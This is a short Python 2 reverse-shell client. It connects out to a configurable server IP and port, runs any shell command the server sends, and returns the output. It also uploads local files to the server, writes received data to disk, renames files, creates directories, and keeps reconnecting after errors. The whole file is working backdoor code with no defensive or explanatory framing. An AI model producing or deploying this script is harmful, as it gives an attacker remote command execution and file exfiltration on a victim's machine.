#!/usr/bin/python
#-*- coding:utf-8 -*-

import os,socket,subprocess,sys        

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = "127.0.0.1"  #Server ip
        port = 8081
        s.connect((host,port))
        s.send(os.getcwd()+">> ")
    
        while True:
            command = s.recv(1024)          
            if  "shutdown" in command or "exit" in command :
                s.close()
                break
            elif len(command)>0:

                if "cd" in command and len(command[3:])>0:
                    os.chdir(command.decode("big5").encode("big5")[3:])
                    s.send(os.getcwd()+">>")

                elif "rename" in command:
                    rename,origin,final =command.split()
                    os.rename(origin.decode("big5").encode("big5"),final.decode("big5").encode("big5"))
                    s.send(os.getcwd()+">> ")

                elif "mkdir" in command:
                    name = command.split()[1].decode("big5")
                    os.mkdir(name.encode("big5"))
                    s.send(os.getcwd()+">>")
                     
                elif "get" in command:      
                    if "filesize" in command :
                        filename = command.split()[1]
                        filesize = os.path.getsize(filename)
                        s.send(str(filesize))
                        
                    else:
                        files = open(filename,"rb")
                        fileread = files.read(1024)
                        while fileread != "":
                            s.send(fileread)
                            fileread = files.read(1024)
                        s.send("Done")
                        s.recv(1024)
                        s.send(os.getcwd()+">>")
                        
                elif "send" in command:  
                    filewrite = open("send.txt","wb")
                    while True:
                        bits = s.recv(1024)            
                        if not bits.endswith("Done"):
                            filewrite.write(bits)
                        else:
                            filewrite.close()
                            break
                    s.send(os.getcwd()+">>")
                    
                    
                    
                else:
                    cmd = subprocess.Popen(command.decode("big5").encode("big5"), shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    output_byte = cmd.stdout.read()+cmd.stderr.read()
                    s.send(output_byte+"\n"+os.getcwd()+">> ")
                          
    except socket.error:
        print "Reconnecting..."
        connect()
        

def main():
    connect()
main()



